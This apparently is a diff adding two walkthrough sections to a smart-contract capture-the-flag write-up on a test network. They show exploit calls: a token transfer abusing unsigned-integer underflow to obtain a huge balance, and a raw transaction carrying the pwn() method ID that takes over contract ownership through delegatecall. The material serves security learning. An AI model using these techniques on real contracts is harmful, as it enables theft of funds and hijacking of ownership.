@@ -180,3 +180,60 @@ And now we are the **owner**:
 ```
 
 [Submit](https://sepolia.etherscan.io/tx/0x8ef00b350da3dfd038b951bdbbef343257d3512e693616ec9ee78564dbd33b5c) level instance to finish.
+
+## 5. Token
+
+First, [create](https://sepolia.etherscan.io/tx/0x0057b7a2bafc16e37bbb1162acc59b79b3cb303b5d395f7b83b1573384fc86e4) the [level instance](https://sepolia.etherscan.io/address/0x2fc1500ccd9f2d3baad615cdcb99b37d3f1c3460):
+
+> The goal of this level is for you to hack the basic token contract below. You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.
+
+In this contract we can see a simple **uint overflow problem** since there are no `SafeMath` checks. If we [pass](https://sepolia.etherscan.io/tx/0x376ba5d5f15eb96049020172b927b18620f313f5538031f51f3b83394819af98) any number larger than 20 to the **value** of the `transfer` it will result in the operation `20 - 21` which is equal to `UintMax`.
+
+```js
+> await contract.transfer("0x871D838738B2B745EAA37216Fc0360C94a319a20", 21)
+```
+
+Then, check the balance:
+
+```js
+> x = await contract.balanceOf(player);
+
+> x.toString();
+
+("115792089237316195423570985008687907853269984665640564039457584007913129639935");
+```
+
+[Submit](https://sepolia.etherscan.io/tx/0x1a97b40f18cd85b8acee1c3aed1c07684056357a1f806b6e254d64b5cb0ebceb) level instance to finish.
+
+## 6. Delegation
+
+First, [create](https://sepolia.etherscan.io/tx/0x64d7cd6f97979ae82e412c74587d223a9588b5d93e7acfec631ace067509a570) the [level instance](https://sepolia.etherscan.io/address/0xb19D92d3F73b0bbB570417f8971e9f129a4fb14F):
+
+> The goal of this level is for you to claim ownership of the instance you are given.
+> Things that might help:
+>
+> - Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
+> - Fallback methods
+> - Method ids
+
+In this level, it's important how `DELEGATECALL` [works](https://solidity-by-example.org/delegatecall/). Once we understand, we need to know the **Method ID** of the function `pwn()`:
+
+```js
+> web3.eth.abi.encodeFunctionSignature("pwn()");
+'0xdd365b8b'
+```
+
+And now, let's create a new [transaction](https://sepolia.etherscan.io/tx/0x76b2416f77b1afd401e4a007e6cb91f5b396b4c252a28f878f834d103f522bb1) that goes to the `fallback` using the `CALLDATA` of `pwn()` to become the **owner**:
+
+```js
+> await web3.eth.sendTransaction({from:player, data:"0xdd365b8b", to:instance})
+```
+
+Check the owner then:
+
+```js
+> await contract.owner()
+'0xB8b74Dc6bce6B16dcd634aB94600a3c9967E6F0D'
+```
+
+We're the owner! [Submit](https://sepolia.etherscan.io/tx/0x83096032db4598b3df1e941ca72e355be3e5f4ae5c4cb7a31f66db80f36cfff8) level instance to finish.
